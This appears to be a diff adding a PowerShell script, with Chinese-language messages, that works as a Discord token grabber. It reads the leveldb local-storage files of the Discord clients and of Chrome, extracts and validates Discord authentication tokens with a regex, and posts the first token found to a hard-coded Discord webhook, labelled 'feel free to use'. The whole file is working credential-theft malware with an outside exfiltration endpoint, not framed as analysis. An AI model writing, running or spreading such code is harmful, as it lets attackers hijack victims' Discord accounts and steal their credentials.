@@ -1,0 +1,80 @@
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+$uri = "https://discord.com/api/webhooks/1552252666967494666/WcVY5L8BobvhbE3wWOwR5Ve4N-Z3PYydrJ05hsRqnh3vKzoHmj8crHQ7cgKA0awQaPxx"
+
+function Validate-DiscordToken {
+    param([string]$token)
+    if ([string]::IsNullOrEmpty($token) -or $token.Length -lt 60 -or $token.Length -gt 150) { return $false }
+    if ($token -notmatch '^MT[A-Za-z0-9]') { return $false }
+    $parts = $token.Split('.')
+    if ($parts.Count -ne 3) { return $false }
+    if ($parts[0].Length -lt 20 -or $parts[0].Length -gt 35) { return $false }
+    if ($parts[1].Length -lt 4 -or $parts[1].Length -gt 12) { return $false }
+    if ($parts[2].Length -lt 25 -or $parts[2].Length -gt 70) { return $false }
+    foreach ($part in $parts) {
+        if ($part -notmatch '^[A-Za-z0-9_-]+$') { return $false }
+    }
+    return $true
+}
+
+$tokens = @()
+$pattern = '(MT[A-Za-z0-9]{1,}\.[\w\-]{4,12}\.[\w\-]{25,70})'
+
+$paths = @(
+    "$env:APPDATA\Discord\Local Storage\leveldb",
+    "$env:APPDATA\discordcanary\Local Storage\leveldb",
+    "$env:APPDATA\discordptb\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
+)
+
+foreach ($path in $paths) {
+    if (-not (Test-Path $path)) { continue }
+    
+    $files = @(Get-ChildItem $path -Filter "*.ldb" -ErrorAction SilentlyContinue) + 
+             @(Get-ChildItem $path -Filter "*.log" -ErrorAction SilentlyContinue)
+    
+    foreach ($file in $files) {
+        try {
+            $content = [System.IO.File]::ReadAllBytes($file.FullName)
+            $text = [System.Text.Encoding]::UTF8.GetString($content)
+            $matches = [regex]::Matches($text, $pattern)
+            
+            foreach ($match in $matches) {
+                $token = $match.Groups[1].Value
+                if ((Validate-DiscordToken $token) -and $token -notin $tokens) {
+                    $tokens += $token
+                }
+            }
+        }
+        catch { }
+    }
+}
+
+if ($tokens.Count -gt 0) {
+    $global:DiscordToken = $tokens[0]
+
+    # 發送 Webhook
+    $payload = @{
+        embeds = @(
+            @{
+                title = "接收到新的discord token"
+                color = 3447003
+                fields = @(
+                    @{
+                        name = "token"
+                        value = '```$DiscordToken```'.Replace('$DiscordToken', $DiscordToken)
+                    }
+                )
+                footer = @{
+                    text = "可以盡情使用"
+                }
+            }
+        )
+    }
+
+    Invoke-RestMethod -Uri $uri -Method Post `
+        -Body ($payload | ConvertTo-Json -Depth 10) `
+        -ContentType "application/json; charset=utf-8"
+} else {
+    Write-Host "找不到 Discord token，程序終止。"
+}
